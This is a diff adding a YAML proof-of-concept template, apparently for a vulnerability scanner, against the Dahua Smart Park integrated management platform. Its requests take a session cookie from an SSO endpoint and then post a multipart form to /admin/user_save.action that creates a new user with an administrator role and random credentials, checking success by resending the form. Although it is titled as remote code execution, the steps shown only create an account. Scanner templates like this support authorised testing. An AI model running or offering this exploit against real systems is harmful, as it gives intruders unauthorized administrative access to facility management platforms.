@@ -1,0 +1,204 @@
+id: poc-yaml-dahua-zhihuiyuanqu-rce
+info:
+  name: 大华智慧园区综合管理平台远程代码执行漏洞
+  severity: critical
+  tags:
+  - rce
+  finger: 大华智慧园区综合管理平台
+variables:
+  r_boundary: to_lower(random_str(10))
+  r_username: to_lower(random_str(10))
+  r_password: to_lower(random_str(10))
+requests:
+- method: GET
+  path: /admin/sso_initSession.action
+  output:
+  - regex_match(headers, "JSESSIONID=(?P<session>[^;]+)")
+  expression: status_code == 200 && !contains(body, "<") && contains(headers, "JSESSIONID")
+- raw: 'POST /admin/user_save.action HTTP/1.1
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36
+    (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36
+
+    Content-Type: multipart/form-data; boundary=----{{.r_boundary}}
+
+    Cookie: JSESSIONID={{.session}}
+
+    Accept-Encoding: gzip, deflate
+
+    Connection: close
+
+
+    ------{{.r_boundary}}
+
+    Content-Disposition: form-data; name="userBean.userType"
+
+
+    0
+
+    ------{{.r_boundary}}
+
+    Content-Disposition: form-data; name="userBean.ownerCode"
+
+
+    001
+
+    ------{{.r_boundary}}
+
+    Content-Disposition: form-data; name="userBean.isReuse"
+
+
+    0
+
+    ------{{.r_boundary}}
+
+    Content-Disposition: form-data; name="userBean.macStat"
+
+
+    0
+
+    ------{{.r_boundary}}
+
+    Content-Disposition: form-data; name="userBean.roleIds"
+
+
+    1
+
+    ------{{.r_boundary}}
+
+    Content-Disposition: form-data; name="userBean.loginName"
+
+
+    {{.r_username}}
+
+    ------{{.r_boundary}}
+
+    Content-Disposition: form-data; name="displayedOrgName"
+
+
+    {{.r_username}}
+
+    ------{{.r_boundary}}
+
+    Content-Disposition: form-data; name="userBean.loginPass"
+
+
+    {{.r_password}}
+
+    ------{{.r_boundary}}
+
+    Content-Disposition: form-data; name="checkPass"
+
+
+    {{.r_password}}
+
+    ------{{.r_boundary}}
+
+    Content-Disposition: form-data; name="userBean.groupId"
+
+
+    0
+
+    ------{{.r_boundary}}
+
+    Content-Disposition: form-data; name="userBean.userName"
+
+
+    {{.r_username}}
+
+    ------{{.r_boundary}}--'
+  expression: status_code == 200 && len(body) == 0
+- raw: 'POST /admin/user_save.action HTTP/1.1
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36
+    (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36
+
+    Content-Type: multipart/form-data; boundary=----{{.r_boundary}}
+
+    Cookie: JSESSIONID={{.session}}
+
+    Accept-Encoding: gzip, deflate
+
+    Connection: close
+
+
+    ------{{.r_boundary}}
+
+    Content-Disposition: form-data; name="userBean.userType"
+
+
+    0
+
+    ------{{.r_boundary}}
+
+    Content-Disposition: form-data; name="userBean.ownerCode"
+
+
+    001
+
+    ------{{.r_boundary}}
+
+    Content-Disposition: form-data; name="userBean.isReuse"
+
+
+    0
+
+    ------{{.r_boundary}}
+
+    Content-Disposition: form-data; name="userBean.macStat"
+
+
+    0
+
+    ------{{.r_boundary}}
+
+    Content-Disposition: form-data; name="userBean.roleIds"
+
+
+    1
+
+    ------{{.r_boundary}}
+
+    Content-Disposition: form-data; name="userBean.loginName"
+
+
+    {{.r_username}}
+
+    ------{{.r_boundary}}
+
+    Content-Disposition: form-data; name="displayedOrgName"
+
+
+    {{.r_username}}
+
+    ------{{.r_boundary}}
+
+    Content-Disposition: form-data; name="userBean.loginPass"
+
+
+    {{.r_password}}
+
+    ------{{.r_boundary}}
+
+    Content-Disposition: form-data; name="checkPass"
+
+
+    {{.r_password}}
+
+    ------{{.r_boundary}}
+
+    Content-Disposition: form-data; name="userBean.groupId"
+
+
+    0
+
+    ------{{.r_boundary}}
+
+    Content-Disposition: form-data; name="userBean.userName"
+
+
+    {{.r_username}}
+
+    ------{{.r_boundary}}--'
+  expression: status_code == 200 && contains(body, "validationError")
+transport: http
